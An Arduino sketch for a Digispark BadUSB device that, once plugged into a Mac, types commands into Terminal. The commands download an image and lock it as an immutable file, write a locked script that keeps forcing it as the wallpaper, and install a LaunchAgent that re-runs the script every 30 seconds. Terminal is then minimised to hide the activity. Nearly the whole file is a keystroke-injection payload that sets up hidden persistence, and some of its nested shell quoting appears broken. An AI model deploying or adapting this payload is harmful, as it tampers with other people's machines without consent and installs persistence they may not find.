#include "DigiKeyboard.h"

#define WALLPAPER_URL "https://apod.nasa.gov/apod/image/2407/MilkyWayBridgePanorama_Perez_2048.jpg"

void setup() {
  pinMode(1, OUTPUT); // LED pin
}

void loop() {
  DigiKeyboard.update();

  // Open Spotlight
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);

  // Open Terminal
  DigiKeyboard.println("Terminal");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  blinkLED();

  // Begin bash block
  DigiKeyboard.println("bash -c '");

  // Step 1: Download the wallpaper
  DigiKeyboard.print("curl -L -o ~/Pictures/wallpaper.jpg \"");
  DigiKeyboard.print(WALLPAPER_URL);
  DigiKeyboard.println("\";");

  // Step 2: Lock the file
  DigiKeyboard.println("chmod 444 ~/Pictures/wallpaper.jpg;");
  DigiKeyboard.println("chflags uchg ~/Pictures/wallpaper.jpg;");

  // Step 3: Create the reset script
  DigiKeyboard.println("mkdir -p ~/Library/Scripts;");
  DigiKeyboard.println("echo \"#!/bin/bash\" > ~/Library/Scripts/reset_wallpaper.sh;");
  DigiKeyboard.println("echo \"WALL=\\\"$HOME/Pictures/wallpaper.jpg\\\"\" >> ~/Library/Scripts/reset_wallpaper.sh;");
  DigiKeyboard.println("echo \"CUR=\\$(osascript -e 'tell application \\\"System Events\\\" to get picture of item 1 of desktops')\" >> ~/Library/Scripts/reset_wallpaper.sh;");
  DigiKeyboard.println("echo \"if [[ \\$CUR != \\$WALL ]]; then\" >> ~/Library/Scripts/reset_wallpaper.sh;");
  DigiKeyboard.println("echo \"osascript -e \\\"tell application \\\\\\\"System Events\\\\\\\" to tell every desktop to set picture to (POSIX file \\\"\\$WALL\\\")\\\"\" >> ~/Library/Scripts/reset_wallpaper.sh;");
  DigiKeyboard.println("echo \"fi\" >> ~/Library/Scripts/reset_wallpaper.sh;");
  DigiKeyboard.println("chmod +x ~/Library/Scripts/reset_wallpaper.sh;");
  DigiKeyboard.println("chflags uchg ~/Library/Scripts/reset_wallpaper.sh;");

  // Step 4: Create LaunchAgent
  DigiKeyboard.println("USERNAME=\\\"$(whoami)\\\";");
  DigiKeyboard.println("PLIST=~/Library/LaunchAgents/com.wallpaper.lock.plist;");
  DigiKeyboard.println("mkdir -p ~/Library/LaunchAgents;");
  DigiKeyboard.println("echo \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\" > $PLIST;");
  DigiKeyboard.println("echo \"<!DOCTYPE plist PUBLIC \\\"-//Apple//DTD PLIST 1.0//EN\\\" \\\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\\\">\" >> $PLIST;");
  DigiKeyboard.println("echo \"<plist version=\\\"1.0\\\">\" >> $PLIST;");
  DigiKeyboard.println("echo \"<dict>\" >> $PLIST;");
  DigiKeyboard.println("echo \"  <key>Label</key>\" >> $PLIST;");
  DigiKeyboard.println("echo \"  <string>com.wallpaper.lock</string>\" >> $PLIST;");
  DigiKeyboard.println("echo \"  <key>ProgramArguments</key>\" >> $PLIST;");
  DigiKeyboard.println("echo \"  <array>\" >> $PLIST;");
  DigiKeyboard.println("echo \"    <string>/bin/bash</string>\" >> $PLIST;");
  DigiKeyboard.println("echo \"    <string>/Users/$USERNAME/Library/Scripts/reset_wallpaper.sh</string>\" >> $PLIST;");
  DigiKeyboard.println("echo \"  </array>\" >> $PLIST;");
  DigiKeyboard.println("echo \"  <key>RunAtLoad</key>\" >> $PLIST;");
  DigiKeyboard.println("echo \"  <true/>\" >> $PLIST;");
  DigiKeyboard.println("echo \"  <key>StartInterval</key>\" >> $PLIST;");
  DigiKeyboard.println("echo \"  <integer>30</integer>\" >> $PLIST;");
  DigiKeyboard.println("echo \"</dict>\" >> $PLIST;");
  DigiKeyboard.println("echo \"</plist>\" >> $PLIST;");

  // Step 5: Load the LaunchAgent
  DigiKeyboard.println("launchctl load $PLIST;");

  // Step 6: Minimize Terminal
  DigiKeyboard.println("osascript -e 'tell application \"Terminal\" to set miniaturized of every window to true'");

  // Close bash -c block
  DigiKeyboard.println("'");

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  blinkLED();

  // Final LED on for visual cue
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(8000);
  digitalWrite(1, LOW);
}

void blinkLED() {
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(200);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(200);
}
